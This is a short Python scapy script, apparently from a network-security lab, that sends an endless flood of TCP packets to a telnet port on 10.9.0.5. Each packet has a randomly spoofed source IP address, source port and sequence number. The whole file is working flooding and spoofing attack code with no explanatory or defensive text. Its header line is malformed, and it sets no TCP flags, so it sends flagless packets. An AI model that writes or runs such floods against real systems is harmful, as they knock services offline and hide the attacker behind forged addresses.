#!/bin/ python3
import os
#os.sys.path.append('/usr/local/lib/python2.7/site-packages')
os.sys.path.append('/home/eternity/.local/lib/python3.8/site-packages')
from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits
ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags=0)
pkt = ip/tcp
while True:
  pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
  pkt[TCP].sport = getrandbits(16) # source port
  pkt[TCP].seq = getrandbits(32) # sequence number
  send(pkt, verbose = 0)